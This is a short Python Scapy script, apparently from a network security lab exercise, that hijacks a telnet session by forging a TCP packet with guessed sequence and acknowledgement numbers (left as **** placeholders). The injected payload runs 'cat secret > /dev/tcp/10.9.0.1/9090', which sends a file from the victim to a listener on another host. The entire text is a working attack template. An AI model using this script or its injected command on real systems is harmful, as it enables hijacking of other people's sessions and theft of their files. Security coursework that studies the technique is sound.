#!/usr/bin/python3
import sys
from scapy.all import *

IPLayer = IP(src="10.9.0.6", dst="10.9.0.5")
TCPLayer = TCP(sport=****, dport=23, flags="A",
               seq=****, ack=****)
Data = "\r cat secret > /dev/tcp/10.9.0.1/9090 \r"
pkt = IPLayer/TCPLayer/Data
ls(pkt)
send(pkt,iface = '****',verbose=0)
